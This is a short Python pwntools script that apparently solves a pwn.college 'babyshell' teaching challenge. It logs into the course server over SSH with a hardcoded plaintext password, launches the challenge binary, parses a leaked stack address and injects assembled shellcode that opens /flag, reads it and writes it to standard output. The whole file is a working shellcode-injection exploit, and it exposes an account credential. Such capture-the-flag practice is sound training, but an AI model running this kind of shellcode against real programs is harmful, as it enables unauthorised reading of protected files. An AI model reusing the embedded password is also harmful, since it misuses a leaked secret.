from pwn import *

s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
context.log_level = 'debug'
context.arch = 'amd64'
# e = ELF('./babyshell_level2_teaching1')
p = s.process("./babyshell_level2_teaching1")
# p = process('./babyshell_level2_teaching1')

p.recvuntil(b'stack at ')
stack = int(p.recvline().split(b'.')[0],16)
print(hex(stack))

s = ''
s += shellcraft.open('/flag')
s += shellcraft.read('rax','rsp',60)
s += shellcraft.write(1, 'rsp', 60)
p.sendlineafter(b'stdin into ',asm(s))


p.interactive()